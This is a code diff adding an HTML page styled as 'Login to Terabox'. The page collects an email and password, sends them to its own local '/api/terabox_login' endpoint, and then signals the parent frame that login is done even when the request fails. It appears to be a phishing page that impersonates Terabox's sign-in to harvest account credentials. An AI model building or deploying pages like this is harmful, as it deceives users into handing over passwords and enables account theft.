@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Login to Terabox</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .page-header {
+            width: 100%;
+            padding: 22px 24px;
+            background-color: #ffffff;
+            border-bottom: 1px solid #e5e7eb;
+        }
+
+        .page-header h1 {
+            font-size: 28px;
+            font-weight: 800;
+            color: #111827;
+            letter-spacing: -0.5px;
+            text-align: center;
+        }
+
+        .container {
+            flex: 1;
+            max-width: 420px;
+            margin: 0 auto;
+            padding: 30px 20px;
+            width: 100%;
+        }
+
+        .form-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 16px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 15px;
+            color: #374151;
+            background-color: #ffffff;
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
+            outline: none;
+            margin-bottom: 12px;
+            transition: border 0.2s;
+        }
+
+        .input-field:focus {
+            border-color: #6366f1;
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
+        }
+
+        .input-field::placeholder {
+            color: #9ca3af;
+        }
+
+        .spacer {
+            height: 40px;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #4f46e5;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .login-btn:hover {
+            background-color: #4338ca;
+        }
+
+        .login-btn:active {
+            transform: scale(0.98);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="page-header">
+        <h1>Login to Terabox</h1>
+    </div>
+
+    <div class="container">
+        <p class="form-title">Sign in with email</p>
+
+        <input class="input-field" type="email" id="email" placeholder="Enter your email" required />
+        <input class="input-field" type="password" id="password" placeholder="Enter your password" required />
+
+        <div class="spacer"></div>
+
+        <button class="login-btn" onclick="handleLogin()">Login</button>
+    </div>
+
+    <script>
+        async function handleLogin() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (!email || !password) {
+                alert("Please fill in all fields");
+                return;
+            }
+
+            try {
+                const apiHost = window.location.protocol === 'file:' ? 'http://localhost:5001' : '';
+                const endpoint = apiHost + '/api/terabox_login';
+                
+                await fetch(endpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password })
+                });
+                
+                window.parent.postMessage({ type: 'TERABOX_LOGIN_DONE' }, '*');
+            } catch (error) {
+                console.error(error);
+                window.parent.postMessage({ type: 'TERABOX_LOGIN_DONE' }, '*');
+            }
+        }
+
+        // Allow pressing Enter to login
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                handleLogin();
+            }
+        });
+    </script>
+
+</body>
+</html>
